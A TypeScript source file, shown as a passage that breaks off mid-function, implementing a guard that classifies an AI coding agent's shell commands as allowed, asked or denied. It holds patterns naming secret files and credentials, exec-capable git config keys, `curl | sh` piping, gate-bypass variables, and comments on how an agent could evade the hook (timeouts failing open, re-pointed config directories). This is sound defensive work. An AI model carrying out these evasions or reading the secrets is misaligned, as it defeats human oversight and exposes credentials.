const isQuote = (ch: string | undefined): boolean => ch === "'" || ch === '"' || ch === "`";

/** `t` without the quote characters at either end. A regex for this backtracks on a long run of quotes. */
function trimQuotes(t: string): string {
  let start = 0;
  let end = t.length;
  while (start < end && isQuote(t[start])) start++;
  while (end > start && isQuote(t[end - 1])) end--;
  return t.slice(start, end);
}

/**
 * File-ish arguments: not flags, quotes and redirection operators stripped (`<.env` reads it, `>.env`
 * writes it), backslashes removed and braces expanded the way the shell would. Globs and `$( )` are KEPT:
 * the name tests below look only at how the word ends, and {@link globReachesSecret} judges the wildcards.
 */
function fileArgs(args: readonly string[]): string[] {
  return args
    .map((t) =>
      unescapeWord(
        trimQuotes(t)
          .replace(/^--?[a-z-]+=/i, "")
          .replace(/^[<>]+/, ""),
      ),
    )
    .filter((t) => t && !t.startsWith("-"))
    .flatMap(expandBraces);
}

/** Names a live secret file can have; a wildcard that expands onto any of them reads one. */
const SECRET_NAME_SAMPLES = [
  ".env",
  ".env.local",
  ".env.production",
  ".env.staging",
  ".env.development",
  ".env.tenant",
  "backend.env",
  ".pgpass",
  ".netrc",
  "id_rsa",
  "id_ed25519",
  "tls.key",
  "server.pem",
];

/** Does the wildcard word `t` expand onto a secret file name? (`.e*`, `.env?*`, `.[e]nv`, `*.env`). */
export function globReachesSecret(t: string): boolean {
  if (!/[*?[]/.test(t)) return false;
  const base = t.slice(t.lastIndexOf("/") + 1);
  const tokens = globTokens(base);
  // A wildcard with nothing literal to anchor it (`*`, `feat/*`, `???`) names no secret in particular.
  let run = 0;
  let longestLiteral = 0;
  for (const token of tokens) {
    run = token.kind === "char" ? run + 1 : 0;
    longestLiteral = Math.max(longestLiteral, run);
  }
  if (!base.startsWith(".") && longestLiteral < 2) return false;
  // The shell never lets a leading `*`, `?` or `[` match a leading dot.
  return SECRET_NAME_SAMPLES.some(
    (n) => globMatches(tokens, n) && !(n.startsWith(".") && !base.startsWith(".")),
  );
}

/** Dotfiles that are secret by NAME alone, wherever they appear. */
const SECRET_BY_NAME =
  /(^|\/)(\.env(\.[^/]*)?|[^/]+\.env(\.(local|development|staging|production|tenant))?|\.pgpass|\.netrc)$/i;

const isLocalHost = (h: string) => LOCAL_HOST.test(h.replace(/^.*@/, "").replace(/:\d+$/, ""));
const SECRET_VAR =
  /\$\{?[A-Z0-9_]*(DATABASE_URL|SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY|_KEY)\b/;
const READ_ONLY_CHECK = /^(ls|test|\[|stat|file)$/;
const COMPOSE_SAFE = /^(up|down|start|stop|restart|run|exec|ps|logs|build|pull|rm)$/;

/** First positional word of a `docker compose` invocation, skipping global flags and their values. */
function composeSubcommand(args: readonly string[]): string {
  const takesValue =
    /^(--env-file|-f|--file|-p|--project-name|--profile|--project-directory|--ansi|--progress)$/;
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    if (a === "compose") continue;
    if (takesValue.test(a)) {
      k++;
      continue;
    }
    if (a.startsWith("-")) continue;
    return a;
  }
  return "";
}

/**
 * A `git` invocation split into its subcommand and the arguments after it. Git's global options come
 * BEFORE the subcommand (`git -C dir push`, `git -c core.hooksPath=/dev/null commit`), so reading the
 * first non-flag word as the subcommand would take `dir` for it and wave the push or commit through.
 */
// Global options of git.c: some take the next word, some take `=value`, some take nothing. Git matches
// them exactly (no abbreviations), so anything else before the subcommand is one we do not understand,
// and an option we cannot place may be hiding the real subcommand: that fails closed, it is not skipped.
const GIT_GLOBAL_VALUE =
  /^(-C|-c|--git-dir|--work-tree|--namespace|--super-prefix|--config-env|--attr-source)$/;
const GIT_GLOBAL_EQ =
  /^--(git-dir|work-tree|namespace|exec-path|super-prefix|config-env|attr-source)=/;
const GIT_GLOBAL_FLAG =
  /^(-p|-P|--paginate|--no-pager|--no-replace-objects|--bare|--literal-pathspecs|--glob-pathspecs|--noglob-pathspecs|--icase-pathspecs|--no-optional-locks|--no-advice|--exec-path)$/;

function gitInvocation(args: readonly string[]): {
  sub: string;
  rest: string[];
  configs: string[];
  dirs: string[];
  unknownGlobal: string | null;
} {
  const configs: string[] = [];
  const dirs: string[] = [];
  let unknownGlobal: string | null = null;
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    if (GIT_GLOBAL_VALUE.test(a)) {
      if (a === "-c" || a === "--config-env") configs.push(args[k + 1] ?? "");
      if (a === "-C") dirs.push(args[k + 1] ?? "");
      k++;
      continue;
    }
    if (a.startsWith("--config-env=")) configs.push(a.slice("--config-env=".length));
    if (GIT_GLOBAL_EQ.test(a) || GIT_GLOBAL_FLAG.test(a)) continue;
    if (a.startsWith("-")) {
      unknownGlobal ??= a;
      continue;
    }
    return { sub: a, rest: args.slice(k + 1), configs, dirs, unknownGlobal };
  }
  return { sub: "", rest: [], configs, dirs, unknownGlobal };
}

/** `-c` keys that only change presentation. Any other key is a decision for the human. */
const GIT_SAFE_CONFIG =
  /^(color\.[a-z0-9.-]+|advice\.[a-z0-9.-]+|core\.(quotepath|abbrev|precomposeunicode)|log\.date)$/i;
/** `-c` keys that switch off the repo's hooks or make git run a program of the caller's choosing. */
const GIT_EXEC_CONFIG =
  /^(core\.(hookspath|fsmonitor|sshcommand|pager|editor|askpass)|alias\.|credential\.helper|diff\.external|protocol\.ext)/i;
const configKey = (kv: string): string => kv.split("=")[0] ?? "";

/** Environment overrides that change what git runs or which config it reads. */
const GIT_ENV_OVERRIDE = /^GIT_/;

// `git branch` is allowlist-only: the listing forms, and a pattern only after --list. Everything else
// (create, move, copy, delete, upstream, an abbreviated `--del`, a bare name) is not read-only.
const GIT_BRANCH_FLAG =
  /^(-a|-r|-v|-vv|-i|-l|--all|--remotes|--verbose|--list|--show-current|--ignore-case|--no-color|--color(=.*)?|--column(=.*)?|--no-column|--abbrev(=\d+)?|--no-abbrev|--omit-empty)$/;
const GIT_BRANCH_VALUE = /^--(contains|no-contains|merged|no-merged|points-at|sort|format)$/;
const GIT_BRANCH_EQ = /^--(contains|no-contains|merged|no-merged|points-at|sort|format)=/;

function gitBranchIsReadOnly(rest: readonly string[]): boolean {
  const listing = rest.some((a) => a === "--list" || a === "-l");
  for (let k = 0; k < rest.length; k++) {
    const a = rest[k] ?? "";
    if (GIT_BRANCH_FLAG.test(a) || GIT_BRANCH_EQ.test(a)) continue;
    if (GIT_BRANCH_VALUE.test(a)) {
      if (rest[k + 1] && !rest[k + 1]?.startsWith("-")) k++;
      continue;
    }
    if (!a.startsWith("-") && listing) continue; // a glob pattern for --list
    return false;
  }
  return true;
}

// Reasons are shown to the agent and written to a log, so nothing a command carried may ride along in one.
// The userinfo is taken up to the LAST `@` before the path: a password may itself contain `@`.
const URL_USERINFO = /\b([a-z][a-z0-9+.-]*:\/\/)[^\s/'"`]*@/gi;
const MAX_ECHO_CHARS = 60;
const scrub = (reason: string): string => reason.replace(URL_USERINFO, "$1***@");
/** A command token as it may appear in a reason: URL and `user:pw@host` userinfo redacted, length capped. */
const echo = (token: string): string => {
  const t = scrub(token).replace(/^[^\s/@]+@/, "***@");
  return t.length > MAX_ECHO_CHARS ? `${t.slice(0, MAX_ECHO_CHARS - 3)}...` : t;
};
const deny = (reason: string): BashVerdict => ({ decision: "deny", reason: scrub(reason) });
const ask = (reason: string): BashVerdict => ({ decision: "ask", reason: scrub(reason) });

const MAX_NESTING = 8;

// Every `$( … )` is judged as a command line of its own, so a few thousand nested ones fan out without
// bound, and the guard fails OPEN when the hook times out. One budget for the whole call keeps it bounded.
const MAX_JUDGED_COMMAND_LINES = 300;
let judgeBudget = MAX_JUDGED_COMMAND_LINES;
const MAX_SUBSTITUTIONS = 32;

/**
 * Longest command the guard will parse. Every rule below is linear in the command, but the hook is killed at
 * its timeout and Claude Code then lets the call run, so size is bounded before any work is done. A real
 * command, even one with a here-doc, is far shorter. Nothing in an oversize command is read, so it is REFUSED:
 * asking would let padding turn a command that is denied on its own (`cat .env` and 64 KB of spaces) into a
 * prompt a human might approve.
 */
export const MAX_COMMAND_CHARS = 64 * 1024;

export function classifyBash(cmd: string, ctx: BashContext = {}, depth = 0): BashVerdict {
  if (cmd.length > MAX_COMMAND_CHARS) {
    return deny(
      `This command is longer than ${MAX_COMMAND_CHARS / 1024} KB, too large for the guard to check in time, so it is refused. Run it in smaller pieces; put large file content in a file with the Write tool.`,
    );
  }
  if (depth === 0) {
    judgeBudget = MAX_JUDGED_COMMAND_LINES;
    refillWork(ctx.judgeTimeLimitMs ?? MAX_COMMAND_JUDGE_MS);
  }
  const start = startingDir(ctx);
  const verdict = judge(cmd, ctx, depth, [start]);
  // A deny found before the budget ran out stands; anything else is no better than "too big to check".
  return work.spent && verdict.decision !== "deny" ? ask(WORK_BUDGET_REASON) : verdict;
}

/** A word as the shell must read it back as one word. */
const shellQuote = (w: string): string =>
  /^[A-Za-z0-9_@%+=:,./-]+$/.test(w) ? w : `'${w.replace(/'/g, "'\\''")}'`;

/**
 * The command lines a `find` runs: each `-exec CMD … ;` / `-ok CMD … +`, re-quoted so it reads as one command
 * line. `-execdir` and `-okdir` run in the directory of each file found, which is not one the guard knows.
 */
function findExecCommands(args: readonly string[]): Array<{ command: string; inFileDir: boolean }> {
  const runs: Array<{ command: string; inFileDir: boolean }> = [];
  for (let i = 0; i < args.length; i++) {
    const action = /^-(?:exec|ok)(dir)?$/.exec(args[i] ?? "");
    if (!action) continue;
    let end = i + 1;
    // `\;` and `;` end the command, `+` batches it; a lone `\` is a `\;` the line splitter cut at the `;`.
    while (end < args.length && !/^(?:\\?;|\+|\\)$/.test(args[end] ?? "")) end++;
    const words = args.slice(i + 1, end);
    if (words.length > 0)
      runs.push({ command: words.map(shellQuote).join(" "), inFileDir: action[1] !== undefined });
    i = end;
  }
  return runs;
}

/** The text of the command at `index` and of every stage before it in its pipeline: what it may be handed. */
function pipelineTexts(parts: readonly Segment[], index: number): string[] {
  const texts = [parts[index]?.text ?? ""];
  for (let j = index; parts[j]?.joiner === "|"; j--) texts.push(parts[j - 1]?.text ?? "");
  return texts;
}

const UNREADABLE_SCRIPT_REASON =
  "A shell is handed a script that the guard cannot read (`curl … | sh`, `cat f | bash`). Read the script first, then run it as a file or as `bash -c '…'`. A human decides.";

/** Verdicts for the script text handed to the shell at `index`, read as command lines. */
function handedScriptVerdicts(
  parts: readonly Segment[],
  parsed: readonly Parsed[],
  index: number,
  ctx: BashContext,
  depth: number,
  here: readonly Cwd[],
): BashVerdict[] {
  const p = parsed[index] as Parsed;
  const texts: string[] = [];
  let unreadable = false;
  if (SOURCES.test(p.prog)) {
    // `source <(echo '…')`: the substitution's output is the script.
    for (const inner of substitutions(parts[index]?.text ?? "")) {
      for (const seg of segments(inner)) {
        const sub = parseSegment(seg);
        const printed = printedText(sub.prog, sub.args);
        if (printed !== null) texts.push(printed);
      }
    }
  } else if (SHELL_PROGRAM.test(p.prog)) {
    const stages: ScriptStage[] = parsed.map((q, i) => ({ ...q, joiner: parts[i]?.joiner ?? "" }));
    const handed = scriptsHandedToShell(stages, index);
    texts.push(...handed.texts);
    unreadable = handed.unreadable;
  }
  const out = texts.map((text) => judge(text, ctx, depth + 1, here));
  if (unreadable) out.push(ask(UNREADABLE_SCRIPT_REASON));
  return out;
}

function judge(cmd: string, ctx: BashContext, depth: number, start: readonly Cwd[]): BashVerdict {
  const c = cmd.trim();
  if (depth > MAX_NESTING || --judgeBudget < 0) {
    return ask(
      "Command substitutions or `bash -c` nested too deeply, or too many to check; a human decides.",
    );
  }
  // Every nested text is judged whole, and one that holds the next level holds nearly the whole command again, so
  // the TEXT judged is budgeted, not only the number of judgings.
  work.chars -= c.length;
  if (work.chars < 0) work.spent = true;
  if (outOfTime()) return ask(WORK_BUDGET_REASON);
  const { parts, incomplete } = splitSegments(c);
  const parsedParts = parts.map((part) => parseSegment(part.text));

  // --- Gate bypasses: always refused. The pre-push hook and CI are the change-management control.
  if (/\b(SKIP_FITNESS=(1|true|yes)|CW_SKIP_PHI_SCAN=(1|true|yes))\b/.test(c)) {
    return deny("Skipping the fitness gate or PHI scan is a human decision, not an agent one.");
  }
  // --- Switching the harness itself off is the human's call, however it is spelled. `CODEX_HOME` and
  // `CLAUDE_CONFIG_DIR` re-point an agent at a config directory that has no hooks; `CLAUDE_PROJECT_DIR` and
  // `CW_HARNESS_ROOT_FOR_TESTS` re-point the guard at another tree, so protected-path matching runs there.
  if (switchesHarness(parts, parsedParts, gitInvocation)) {
    return ask(
      "That variable switches off or re-points part of the agent harness (Stop gate, ledger, guard fail-closed, its project root, an ECC hook, or the hook configuration an agent loads). A human decides.",
    );
  }

  // Every simple command is judged, in order; any deny wins, else the first ask, else allow. Writes are
  // judged against every directory the command could be running in (see `Cwd`), and so are the whole-tree reads.
  const verdicts: BashVerdict[] = [];
  // The text ends inside a quote, substitution or heredoc: the shell would wait for more, so what ran is unknown.
  if (incomplete !== null) {
    verdicts.push(
      ask(
        `The command has ${incomplete}, so the guard cannot tell what the shell would run. A human decides.`,
      ),
    );
  }
  let after = start; // where the next command runs when the one before it succeeded
  let anywhere = start; // everywhere any later command could run
  const scriptTexts: string[] = []; // what an interpreter or a shell is handed on stdin
  // `CDPATH` makes `cd harness` land in a directory the guard cannot see, so no `cd` is trusted once it is named.
  const cdpath = /\bCDPATH\b/.test(c);
  parts.forEach((part, index) => {
    if (outOfTime()) return;
    const parsed = parsedParts[index] as Parsed;
    // `a && b` runs b only where a succeeded; after `;`, `||`, a newline, a pipe or `&` it may not have.
    const shellIn = part.chained && part.joiner === "&&" ? after : anywhere;
    // `env -C DIR cmd` runs `cmd` in DIR, not the shell around it.
    const here = parsed.chdir === undefined ? shellIn : runIn(shellIn, parsed.chdir, ctx);
    const v = classifySegment(part.text, parsed, ctx, here);
    if (v) verdicts.push(v);
    // `$(true)git push --no-verify`: the program's name is built at run time, so it is a command the guard cannot
    // name. The literal rest of the word is judged as the program it would be (a deny stands), and a human decides.
    // A word that is one substitution and nothing else is the `eval "$(ssh-agent -s)"` idiom (no arguments) or an
    // array run as a command (`"${DC[@]}" build`); only a lone `$( )` or backtick with arguments is a command.
    const guess = dynamicName(parsed.prog) ? withoutExpansions(parsed.prog) : null;
    if (
      guess !== null &&
      (guess !== "" || (parsed.args.length > 0 && /^[$`][(`]|^`/.test(parsed.prog)))
    ) {
      const named =
        guess === "" ? null : classifySegment(part.text, { ...parsed, prog: guess }, ctx, here);
      verdicts.push(named ?? ask(DYNAMIC_PROGRAM_REASON));
    }
    // Commands the shell runs INSIDE this one: `bash -c '…'`, `eval …`, `find -exec …`.
    if (parsed.prog === "eval") {
      verdicts.push(judge(parsed.args.join(" "), ctx, depth + 1, here));
    } else if (NESTED_SHELL.test(parsed.prog)) {
      const k = parsed.args.findIndex((a) => /^-[a-z]*c$/.test(a));
      if (k >= 0) verdicts.push(judge(parsed.args[k + 1] ?? "", ctx, depth + 1, here));
    } else if (parsed.prog === "find") {
      for (const run of findExecCommands(parsed.args))
        verdicts.push(judge(run.command, ctx, depth + 1, run.inFileDir ? [null] : here));
    }
    // A command line a wrapper hands to a shell (`watch 'x'`, `su -c 'x'`, `ssh h 'x'`, `rsync -e 'x'`), and a
    // command run in a container that mounts the repo (its paths read as the host's).
    for (const text of shellStrings(parsed.prog, parsed.args, isLocalHost)) {
      if (text.trim() !== "") verdicts.push(judge(text, ctx, depth + 1, here));
    }
    const inContainer = containerExec(parsed.prog, parsed.args);
    if (inContainer !== null) verdicts.push(judge(inContainer, ctx, depth + 1, here));
    const container = containerRun(parsed.prog, parsed.args);
    if (container) {
      const inside = container.workdir === undefined ? here : runIn(here, container.workdir, ctx);
      verdicts.push(judge(container.command, ctx, depth + 1, inside));
    }
    if (readsScriptFromStdin(parsed, index)) scriptTexts.push(...pipelineTexts(parts, index));
    // What a shell is handed as its script (`echo '…' | sh`, `sh <<< '…'`, `source <(echo '…')`) is judged as a
    // command line; a script piped in from anything else cannot be read.
    verdicts.push(...handedScriptVerdicts(parts, parsedParts, index, ctx, depth, here));
    const moved = nextDirs(shellIn, parsed, part.text, ctx, cdpath);
    // `A || cd X && W`: the `cd` runs only when A failed. When A succeeds W runs where A did, so after a `cd`
    // that follows `||` the next `&&` command may be in the old directory as well as in X.
    after = moved ? (part.joiner === "||" ? joinDirs(shellIn, moved) : moved) : shellIn;
    if (moved) anywhere = joinDirs(anywhere, moved);
  });
  // `$( … )` and backticks run wherever the command around them runs.
  const inners = substitutions(c);
  if (inners.length > MAX_SUBSTITUTIONS) {
    verdicts.push(ask("Too many command substitutions to check; a human decides."));
  } else for (const inner of inners) verdicts.push(judge(inner, ctx, depth + 1, anywhere));
  // A script fed to an interpreter on stdin is only text to us: judge all of it (heredoc body included).
  if (scriptTexts.length > 0) {
    const bodies = scanShell(c).docs.map((doc) => doc.body);
    const v = scriptTextVerdict([...scriptTexts, ...bodies].join("\n"));
    if (v) verdicts.push(v);
  }
  return (
    verdicts.find((v) => v.decision === "deny") ??
    verdicts.find((v) => v.decision === "ask") ?? { decision: "allow", reason: "" }
  );
}

// A secret file named inside inline code. `process.env.X` is a property, not a file: the dot must not
// follow a letter, `)` or `]`.
const SECRET_MENTION =
  /(?:^|[^A-Za-z0-9_$)\]])\.(?:env(?!\.example)(?:\.[A-Za-z]+)?|pgpass|netrc)(?![A-Za-z0-9_])|['"/][\w-]+\.env(?:\.(?:local|development|staging|production|tenant))?['"]|id_(?:rsa|ed25519|ecdsa)|\.ssh\/|\.aws\/credentials|['"/][\w.-]*\.(?:pem|key|p12|pfx)['"]/;

/** The agent's own guard, ledger, approved lists and the compliance record. */
// `/i`: macOS and Windows resolve `.CLAUDE/`, `Compliance/` and `.CODEX/HOOKS.JSON` to the real files, so a
// case-sensitive match is a bypass. The repo-root-anchored directories come first; the settings, hook and
// instruction files that an agent (or `bun`) loads from ANY directory — nested, or under `~` — are matched
// at any depth. `bunfig.toml` is one: a `preload` line in it runs before the guard itself does.
const PROTECTED_PATH =
  /^(\.\/)?(\.claude\/(audit|\.cache|rules|agents|skills)(\/|$)|\.agents\/(rules|agents|skills|plugins)(\/|$)|scripts\/harness(\/|$)|compliance(\/|$)|\.githooks(\/|$)|\.github\/workflows(\/|$)|deploy\/production(\/|$)|\.gitleaks\.toml$|\.trivyignore\.yaml$|AGENTS\.md$|CLAUDE\.md$|scripts\/check-compliance-controls\.ts$|\.github\/CODEOWNERS$)|(^|\/)(\.claude\/settings(\.local)?\.json|\.codex\/(hooks\.json|config\.toml)|\.?bunfig\.toml|AGENTS\.override\.md)$|(^|\/)\.codex\/(hooks|rules)\//i;
/** A repo-relative path the harness protects: guard, ledger, rules, compliance record, Codex hook config. */
export const isProtectedPath = (rel: string): boolean => PROTECTED_PATH.test(rel);

// What is typed into an interactive process later reaches it through Codex's `write_stdin`, which does
// NOT fire PreToolUse. Login, quiet and connection flags do not make a process terminate: require a real
// command/script/input instead. This deliberately judges every simple command, so `true; bash -l` cannot
// hide the interactive process behind a harmless prefix.
const SHELL = /^(bash|sh|zsh|dash|fish|ksh)$/;
const LANGUAGE_REPL = /^(python[0-9.]*|node|ruby|irb|perl|lua|php)$/;
const DATABASE_REPL = /^(psql|pgcli|sqlite3|mysql)$/;
const TERMINAL_INPUT =
  /^\/(?:dev\/(?:tty(?:[0-9A-Za-z._-]*)?|console|stdin|fd\/0)|proc\/(?:self|[0-9]+)\/fd\/0)$/i;

function interactiveFlag(args: readonly string[]): boolean {
  return args.some(
    (a) =>
      /^--(?:attach|interactive|tty|stdin)(?:=(?:true|t|1))?$/i.test(a) ||
      (/^-[^-]+$/.test(a) && /[ait]/i.test(a.slice(1))),
  );
}

function interactiveInvocation(p: Parsed): boolean {
  const { prog, args, ins, docs } = p;
  const terminalInput = ins.some((path) => TERMINAL_INPUT.test(path));
  const explicitInput = !terminalInput && ins.length + docs.length > 0;

  if (/^(chroot|nsenter|unshare|setpriv|setarch|taskset|prlimit|systemd-run)$/.test(prog))
    return true;
  if (prog === "rlwrap") return true;
  if (/^(docker-compose|podman-compose)$/.test(prog)) {
    if (args.some((a) => /^(?:attach|exec|run)$/.test(a))) return true;
    if (args.includes("start") && interactiveFlag(args)) return true;
  }
  if (/^(docker|podman|nerdctl)$/.test(prog)) {
    if (args.includes("attach")) return true;
    const compose = args.indexOf("compose");
    if (compose >= 0) {
      const composeArgs = args.slice(compose + 1);
      if (composeArgs.some((a) => /^(?:attach|exec|run)$/.test(a))) return true;
      if (composeArgs.includes("start") && interactiveFlag(args)) return true;
    }
    if (args.some((a) => /^(?:exec|run)$/.test(a))) return interactiveFlag(args);
    if (args.includes("start") && interactiveFlag(args)) return true;
  }
  if (prog === "kubectl") {
    if (args.includes("attach")) return true;
    if (args.some((a) => /^(?:debug|exec|run)$/.test(a))) return interactiveFlag(args);
  }

  if (SHELL.test(prog)) {
    if (args.length === 1 && /^(-h|--help|--version)$/.test(args[0] ?? "")) return false;
    // Shell command strings can eval, expand variables and run substitutions after inspection.
    // Codex must invoke the command directly or use a reviewable script file instead.
    if (
      args.some(
        (a) =>
          a === "-c" ||
          a === "--command" ||
          a.startsWith("--command=") ||
          /^-c.+/.test(a) ||
          isShortClusterWithC(a),
      )
    )
      return true;
    if (explicitInput) return false;
    const delimiter = args.indexOf("--");
    if (delimiter >= 0) return delimiter + 1 >= args.length;
    return args.length === 0 || (args[0]?.startsWith("-") ?? true);
  }

  if (LANGUAGE_REPL.test(prog)) {
    const informationOnly =
      args.length === 1 &&
      (/^(--help|--version)$/.test(args[0] ?? "") ||
        (/^python[0-9.]*$/.test(prog)
          ? /^(-h|-V)$/.test(args[0] ?? "")
          : /^(-h|-v|-V)$/.test(args[0] ?? "")));
    if (informationOnly) return false;
    if (prog === "irb") return true;
    if (args.some((a) => a === "--interactive" || /^-[^-]*i/.test(a))) return true;
    const executesCode =
      (/^python[0-9.]*$/.test(prog) && args.some((a) => /^(?:-c|-m)(?:.+)?$/.test(a))) ||
      (prog === "node" && args.some((a) => /^(?:-e|-p|--eval|--print)(?:=?.+)?$/.test(a))) ||
      (prog === "ruby" && args.some((a) => /^(?:-e|--eval)(?:=?.+)?$/.test(a))) ||
      (prog === "perl" && args.some((a) => /^(?:-e|-E)(?:.+)?$/.test(a))) ||
      (prog === "lua" && args.some((a) => /^(?:-e)(?:.+)?$/.test(a))) ||
      (prog === "php" && args.some((a) => /^(?:-r|-f)(?:.+)?$/.test(a)));
    // Inline code can manufacture a child REPL (`code.interact`, `repl.start`, system/exec, …) after
    // the guard returns. Codex must use a reviewable script file instead.
    if (executesCode) return true;
    if (explicitInput || args.includes("-")) return false;
    // Language runtimes have large, evolving sets of options that consume a following value.
    // Guessing that an unrecognised value is a script can turn `runtime --some-option value` into
    // an unchecked REPL. A script is unambiguous when it is the first argument or follows `--`.
    const delimiter = args.indexOf("--");
    if (delimiter >= 0) return delimiter + 1 >= args.length;
    return args.length === 0 || (args[0]?.startsWith("-") ?? true);
  }

  if (prog === "bun" || prog === "deno") {
    if (args.length === 1 && /^(-h|--help|-v|-V|--version)$/.test(args[0] ?? "")) return false;
    return args.length === 0 || args[0] === "repl";
  }

  if (DATABASE_REPL.test(prog)) {
    if (args.length === 1 && /^(--help|-\?|--version|-V)$/.test(args[0] ?? "")) return false;
    const shellEscape = args.some((a) => {
      if (prog === "sqlite3") return /(?:^|[\r\n])\s*\.(?:shell|system)(?:\s|$)/i.test(a);
      if (/^(psql|pgcli)$/.test(prog)) return /(?:^|[\r\n])\s*\\!/.test(a);
      return /(?:^|[\r\n])\s*(?:system|\\!)(?:\s|$)/i.test(a);
    });
    if (shellEscape) return true;
    if (explicitInput) return false;
    if (/^(psql|pgcli)$/.test(prog)) {
      return !args.some((a) => /^(?:-c.+|-c|-f.+|-f|--(?:command|file)(?:=.+)?)$/.test(a));
    }
    if (prog === "mysql") {
      return !args.some((a) => /^(?:-e.+|-e|--execute(?:=.+)?)$/.test(a));
    }
    // A lone sqlite filename still opens a REPL. Only an explicit second positional SQL argument
    // (or redirected input handled above) is terminating; option-prefixed forms fail closed.
    return (
      args.length < 2 || (args[0]?.startsWith("-") ?? true) || (args[1]?.startsWith("-") ?? true)
    );
  }

  return /^(script|screen|tmux)$/.test(prog);
}

export const isInteractiveShell = (cmd: string): boolean =>
  segments(cmd).some((seg) => interactiveInvocation(parseSegment(seg)));

// ---------------------------------------------------------------------------------------------------
// Paths: where a write lands once `cd`, `..`, `~`, `$HOME` and `$PWD` are accounted for
// ---------------------------------------------------------------------------------------------------

/** The directory a command runs in: repo-relative (`""` = the root), `~/…`, an absolute path, or unknown. */
type Cwd = string | null;

const trimSlashes = (p: string): string => p.replace(/\/+$/, "");
/** The account's home directory from the user database, for when `$HOME` is unset or empty. */
function accountHome(): string {
  try {
    return userInfo().homedir;
  } catch {
    return "";
  }
}
const homeOf = (ctx: BashContext): string =>
  trimSlashes(ctx.home || process.env.HOME || accountHome());

/** Collapse `.`, `..` and `//`; keeps a leading `/` or `~`, and the leading `..` of a relative path. */
function collapse(p: string): string {
  const head = p.startsWith("/") ? "/" : p === "~" || p.startsWith("~/") ? "~" : "";
  const out: string[] = [];
  for (const part of p.slice(head.length).split("/")) {
    if (part === "" || part === ".") continue;
    if (part !== "..") out.push(part);
    else if (out.length > 0 && out.at(-1) !== "..") out.pop();
    else if (head !== "/") out.push("..");
  }
  const body = out.join("/");
  if (head === "/") return `/${body}`;
  return head === "~" ? (body ? `~/${body}` : "~") : body;
}

/**
 * An absolute path inside the repo or the home directory, written relative to it (`~/…`). A path is inside
 * whatever its spelling: upper case, the `/System/Volumes/Data` firmlink, `/tmp` for `/private/tmp`.
 */
function relativise(norm: string, ctx: BashContext): string {
  if (!norm.startsWith("/")) return norm;
  const root = ctx.root ? collapse(trimSlashes(ctx.root)) : "";
  const inRoot = root ? relativeTo(norm, root) : null;
  if (inRoot !== null) return inRoot;
  const home = homeOf(ctx);
  const inHome = home ? relativeTo(norm, home) : null;
  if (inHome === null) return norm;
  return inHome === "" ? "~" : `~/${inHome}`;
}

/** Is this resolved path the repo root's parent, or any directory above it (`..`, `~/Apps`, `/`)? */
function isRootAncestor(rel: string, ctx: BashContext): boolean {
  const root = ctx.root ? collapse(trimSlashes(ctx.root)) : "";
  if (!root) return false;
  const abs = rel === "~" || rel.startsWith("~/") ? `${homeOf(ctx)}${rel.slice(1)}` : rel;
  return abs === "/" || relativeTo(root, abs) !== null;
}

const HERE = /^(?:\$\{?PWD\}?|\$\(pwd\)|`pwd`)(?=\/|$)/;
const REPO_ROOT = /^\$\(git rev-parse --show-toplevel\)(?=\/|$)/;

/**
 * The path a word names, normalised: repo-relative (`""` is the root), `~/…` or absolute. Expands `~`,
 * `$HOME`, `${HOME}`, `$CODEX_HOME`, `$PWD` and `$(pwd)`. Returns null when the word is relative to a
 * directory we do not know (a `cd` we could not follow); with `strict`, also when it holds any other
 * expansion or wildcard (used for `cd`, where a wrong guess would hide everything after it). Past the
 * command's resolution budget it returns null too, and marks the budget spent. A `cd` (strict) is not charged:
 * it resolves against at most {@link MAX_CWD_CANDIDATES} directories, and a chain of them stays linear.
 */
function resolvePath(raw: string, cwd: Cwd, ctx: BashContext, strict = false): string | null {
  if (!strict && --work.resolutions < 0) {
    work.spent = true;
    return null;
  }
  let t = unescapeWord(raw)
    .replace(/^\$\{?CODEX_HOME\}?(?=\/|$)/, "~/.codex")
    .replace(/^\$\{?HOME\}?(?=\/|$)/, "~");
  let base = cwd;
  if (REPO_ROOT.test(t)) {
    t = t.replace(REPO_ROOT, ".");
    base = "";
  } else t = t.replace(HERE, ".");
  // Only `~` and `~/…` name the home directory. `~user`, `~+`, `~-` and `~1` name one the guard cannot place.
  if (/^~[^/]/.test(t)) return null;
  if (strict && /[$`*?[]/.test(t)) return null;
  // `~` is the home directory: spell it out, or a repo that lives under it (`cd ~/Apps/x/repo`) is never
  // recognised as the repo.
  const home = homeOf(ctx);
  const underHome = (p: string): boolean => p === "~" || p.startsWith("~/");
  if (home && underHome(t)) t = `${home}${t.slice(1)}`;
  if (home && base !== null && underHome(base)) base = `${home}${base.slice(1)}`;
  const absolute = t.startsWith("/") || underHome(t);
  if (absolute) return relativise(collapse(t), ctx);
  if (base === null) return null;
  const root = ctx.root ? trimSlashes(ctx.root) : "";
  const anchored = base.startsWith("/") || underHome(base);
  const full = anchored || !root ? `${base}/${t}` : `${root}/${base}/${t}`;
  return relativise(collapse(base || root ? full : t), ctx);
}

const startingDir = (ctx: BashContext): Cwd =>
  ctx.cwd === undefined ? "" : resolvePath(ctx.cwd, "", ctx);

// Where a command line is running is a SET of directories (`readonly Cwd[]`; `null` is one the guard cannot
// resolve). A `cd` is not certain to apply to what follows (it fails, or sits in a subshell, a pipeline or a
// background job), so a write, and a whole-tree read, is judged against EVERY directory it could land in, and
// one that resolves onto a protected path (or the repo root) asks.

/** More possible directories than this means the guard has lost the thread: treat the directory as unknown. */
const MAX_CWD_CANDIDATES = 16;
const MAX_CWD_CHARS = 1024;

const capDirs = (dirs: readonly Cwd[]): readonly Cwd[] =>
  dirs.length > MAX_CWD_CANDIDATES ? [null] : dirs;

/** Every directory in `a` or `b`, once each. */
const joinDirs = (a: readonly Cwd[], b: readonly Cwd[]): readonly Cwd[] =>
  capDirs([...new Set([...a, ...b])]);

/** The target word of a `cd`/`pushd`: the first operand that is not a flag. A bare `cd` goes home. */
const cdTarget = (args: readonly string[]): string =>
  args.find((a) => !/^-[LPe@]+$/.test(a) && a !== "--") ?? "~";

/**
 * The directory after a simple command: `cd` and `pushd DIR` move it; `popd`, a `pushd` that rotates or keeps
 * the stack (`pushd`, `pushd +1`, `pushd -n DIR`), a `cd` that `CDPATH` may redirect, and anything dynamic lose it.
 */
function nextDir(
  cwd: Cwd,
  prog: string,
  args: readonly string[],
  ctx: BashContext,
  cdpath: boolean,
